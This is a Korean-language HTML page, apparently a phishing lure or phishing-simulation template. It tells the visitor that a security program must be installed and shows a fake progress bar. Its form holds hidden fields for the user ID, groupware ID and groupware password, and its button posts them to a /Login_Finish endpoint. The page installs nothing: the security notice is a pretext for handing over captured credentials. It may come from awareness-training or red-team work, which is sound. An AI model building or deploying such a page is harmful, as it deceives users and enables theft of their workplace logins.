<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>보안 프로그램 설치 안내</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .message-container {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 400px;
        }
        h2 {
            color: #d9534f;
            margin-bottom: 20px;
        }
        p {
            font-size: 16px;
            margin-bottom: 30px;
        }
        button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            border : none;
            transition: background-color 0.3s ease;
            cursor : pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .progress-bar-container {
            width: 100%;
            background-color: #f0f0f0;
            border: 1px solid #ccc;
            border-radius: 5px;
            overflow: hidden;
            height: 20px;
            margin-top: 30px;
            position: relative;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(to right, #66ccff, #0044cc);
            position: absolute;
            animation: moveBar 4s linear infinite;
        }
        @keyframes moveBar {
            0% {
                left: -100%;
                width: 100%;
            }
            100% {
                left: 100%;
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="message-container">
        <h2>보안 프로그램 설치 필요</h2>
        <p>이 페이지를 이용하시려면 보안 프로그램 설치가 필요합니다.<br>
        안전한 서비스를 위해 아래 버튼을 클릭하여<br>
        프로그램을 설치해 주세요.</p>
        <form id="loginForm">
            <input type="hidden" name="user_id" value="{{user_id}}">
            <input type="hidden" name="groupware_id" value="{{groupware_id}}">
            <input type="hidden" name="groupware_pw" value="{{groupware_pw}}">
            <button type="submit" class="link-button">제출</button>
        </form>
        <div class="progress-bar-container">
            <div class="progress-bar"></div>
        </div>
    </div>
</body>

<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();  // 폼 기본 동작(페이지 이동) 막기

    const formData = new FormData(this);

    fetch("/Login_Finish", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log("서버에 성공적으로 전송됨");
        } else {
            console.error("전송 실패");
        }
    })
    .catch(error => {
        console.error("오류 발생:", error);
    });
});
</script>

</html>
